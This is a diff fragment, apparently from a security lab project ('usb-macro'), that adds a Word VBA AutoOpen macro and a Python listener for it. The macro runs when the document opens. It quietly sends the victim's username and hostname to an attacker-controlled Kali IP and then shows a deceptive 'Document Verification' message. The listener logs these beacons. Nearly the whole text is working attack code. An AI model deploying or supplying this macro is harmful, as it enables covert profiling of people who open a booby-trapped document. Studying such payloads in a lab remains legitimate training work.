@@ -1,1 +1,48 @@
+Sub AutoOpen()
+    Dim strKaliIP As String
+    strKaliIP = "192.168.50.X" ' Replace with Kali IP
 
+    Dim logPath As String
+    logPath = Environ("TEMP") & "\access_log.txt"
+    Open logPath For Output As #1
+        Print #1, "===== PAYLOAD EXECUTED ====="
+        Print #1, "Timestamp : " & Now()
+        Print #1, "Username  : " & Environ("USERNAME")
+        Print #1, "Hostname  : " & Environ("COMPUTERNAME")
+    Close #1
+
+    On Error Resume Next
+    Dim objHTTP As Object
+    Set objHTTP = CreateObject("MSXML2.XMLHTTP")
+    objHTTP.Open "GET", "http://" & strKaliIP & ":8080/beacon?user=" & _
+        Environ("USERNAME") & "&host=" & Environ("COMPUTERNAME"), False
+    objHTTP.Send
+
+    MsgBox "This document is macro level protected.", vbInformation, "Document Verification"
+End Sub
+EOF
+
+# 3. Add the Python beacon listener to its subfolder
+cat << 'EOF' > project-14-usb-macro/listeners/beacon_listener.py
+#!/usr/bin/env python3
+from http.server import HTTPServer, BaseHTTPRequestHandler
+import urllib.parse
+from datetime import datetime
+
+class BeaconHandler(BaseHTTPRequestHandler):
+    def do_GET(self):
+        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
+        parsed = urllib.parse.urlparse(self.path)
+        params = urllib.parse.parse_qs(parsed.query)
+        
+        print(f"\n[BEACON RECEIVED] {ts}")
+        print(f"Source IP : {self.client_address[0]}")
+        print(f"User      : {params.get('user', ['N/A'])[0]}")
+        print(f"Host      : {params.get('host', ['N/A'])[0]}")
+        
+        self.send_response(200)
+        self.end_headers()
+
+print("[*] Listener active on port 8080...")
+HTTPServer(("0.0.0.0", 8080), BeaconHandler).serve_forever()
+EOF
